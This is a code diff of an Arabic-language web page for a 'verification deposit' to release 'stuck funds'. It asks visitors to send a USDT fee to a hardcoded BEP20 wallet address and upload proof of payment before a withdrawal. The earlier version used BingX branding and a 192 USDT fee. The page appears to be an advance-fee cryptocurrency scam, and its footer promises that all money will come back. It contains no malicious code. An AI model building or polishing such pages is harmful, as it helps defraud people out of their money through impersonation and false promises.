@@ -3,43 +3,127 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>التداول - الشكل القديم</title>
+<title>إيداع التحقق - سحب الأموال العالقة</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
+:root{
+  --bg-gradient: linear-gradient(135deg,#0f2027,#203a43);
+  --accent:#f1c40f;
+  --card-bg:rgba(255,255,255,0.05);
+  --btn-primary:#f1c40f;
+  --btn-ghost:#fff;
+  --text-muted:rgba(255,255,255,0.7);
+}
 body{
-  background: linear-gradient(135deg,#0f2027,#203a43);
+  margin:0;
+  font-family:'Tajawal', sans-serif;
+  background: var(--bg-gradient);
   color:#fff;
   direction:rtl;
-  font-family:'Tajawal', sans-serif;
 }
-.container{max-width:600px;margin:20px auto;padding:10px;}
-.brand{color:#f1c40f; font-weight:700; font-size:20px;}
-.card{background:rgba(255,255,255,0.05); padding:20px; border-radius:12px; margin:12px 0;}
-.btn{cursor:pointer; padding:8px 14px; border:none; border-radius:6px; font-size:14px;}
-.btn-primary{background:#f1c40f; color:#000; font-weight:600;}
+.container{
+  max-width:700px;
+  margin:20px auto;
+  padding:10px;
+}
+.brand{
+  color:var(--accent);
+  font-weight:700;
+  font-size:24px;
+  margin-bottom:10px;
+}
+.card{
+  background:var(--card-bg);
+  padding:25px;
+  border-radius:15px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.6);
+  margin-bottom:20px;
+}
+h3,h4{
+  margin:0 0 12px 0;
+}
+.muted{
+  color:var(--text-muted);
+  font-size:14px;
+}
+.wallet-row{
+  display:flex;
+  gap:12px;
+  flex-wrap:wrap;
+  margin-bottom:12px;
+}
+.wallet-address{
+  background:rgba(255,255,255,0.1);
+  padding:8px;
+  border-radius:6px;
+  overflow-x:auto;
+  white-space:nowrap;
+  font-family:monospace;
+}
+.wallet-address::-webkit-scrollbar{
+  height:6px;
+}
+.wallet-address::-webkit-scrollbar-thumb{
+  background:var(--accent);
+  border-radius:3px;
+}
+input[type="text"], input[type="number"], input[type="file"]{
+  width:100%;
+  padding:8px 10px;
+  border-radius:6px;
+  border:none;
+  margin-top:4px;
+  background:rgba(255,255,255,0.1);
+  color:#fff;
+}
+input::placeholder{color:var(--text-muted);}
+.btn{
+  cursor:pointer;
+  padding:10px 16px;
+  border:none;
+  border-radius:8px;
+  font-size:15px;
+  font-weight:600;
+  transition:0.2s;
+}
+.btn:hover{opacity:0.9;}
+.btn-primary{background:var(--btn-primary); color:#000;}
 .btn-ghost{background:transparent; color:#fff; border:1px solid #fff;}
-.small-input{padding:6px 10px; border-radius:6px; border:none; width:100%; margin-top:4px;}
-.wallet-row{display:flex; gap:12px; align-items:flex-start; flex-wrap:wrap;}
-.muted{color:rgba(255,255,255,0.7); font-size:13px;}
-.proof-name{margin-top:6px; font-size:13px; color:#f1c40f;}
-.alert-note{background:#2c3e50; padding:10px; border-left:4px solid #f1c40f; margin:10px 0; font-size:14px;}
+.proof-name{margin-top:6px; font-size:13px; color:var(--accent);}
+.alert-note{
+  background:rgba(255,255,255,0.08);
+  padding:12px;
+  border-left:4px solid var(--accent);
+  font-size:14px;
+  margin:10px 0;
+  border-radius:6px;
+}
+.footer-note{
+  text-align:center;
+  margin-top:20px;
+  color:var(--text-muted);
+  font-size:13px;
+}
+hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
 </style>
 </head>
 <body>
 <div class="container">
-  <div class="brand">BingX — إيداع التحقق</div>
+  <div class="brand">أهلاً بكم بإيداع التحقق الخاص بسحب الأموال العالقة</div>
 
   <div class="card">
     <h3>إيداع التحقق</h3>
-    <p class="muted">يتطلب النظام رسوم تحقق مقدارها <strong>192 USDT</strong>.</p>
+    <p class="muted">يرجى إرسال رسوم التحقق إلى عنوان المحفظة أدناه ورفع إثبات الدفع لبدء المراجعة.</p>
 
     <div class="wallet-row">
       <div style="flex:1">
         <label>عنوان الإيداع (شبكة BEP20)</label>
         <div class="wallet-address" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
+        <div class="muted">USDT - BEP20</div>
       </div>
       <div style="min-width:160px">
         <label>نسخ العنوان</label><br>
-        <button class="btn btn-ghost small" onclick="copyDepositAddress()">📋 نسخ</button>
+        <button class="btn btn-ghost" onclick="copyDepositAddress()">📋 نسخ</button>
       </div>
     </div>
 
@@ -56,13 +140,11 @@ body{
     <hr/>
 
     <h4>طلب سحب بعد التحقق</h4>
-    <div class="alert-note">
-      ⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة
-    </div>
+    <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة</div>
 
     <div class="wallet-row">
-      <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)" class="small-input"/>
-      <input id="withdraw-target-wallet" placeholder="عنوان محفظة السحب (BEP20)" class="small-input"/>
+      <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)"/>
+      <input id="withdraw-target-wallet" placeholder="عنوان محفظة السحب (BEP20)"/>
     </div>
 
     <div style="margin-top:10px">
@@ -77,20 +159,24 @@ body{
 
     <p id="withdraw-msg" class="muted"></p>
   </div>
+
+  <div class="footer-note">
+    ملاحظة: جميع الأموال سوف تعود لك عند اكتمال طلب الإيداع والسحب
+  </div>
 </div>
 
 <script>
-document.getElementById('proof-file')?.addEventListener('change', e=>{
+document.getElementById('proof-file').addEventListener('change', e=>{
   const f = e.target.files[0];
   document.getElementById('proof-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
 });
-document.getElementById('locked-funds-file')?.addEventListener('change', e=>{
+document.getElementById('locked-funds-file').addEventListener('change', e=>{
   const f = e.target.files[0];
   document.getElementById('locked-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
 });
 
 function copyDepositAddress(){
-  const addr = document.getElementById('deposit-address')?.innerText || '';
+  const addr = document.getElementById('deposit-address').innerText;
   if(addr) alert('تم نسخ عنوان الإيداع');
 }
 
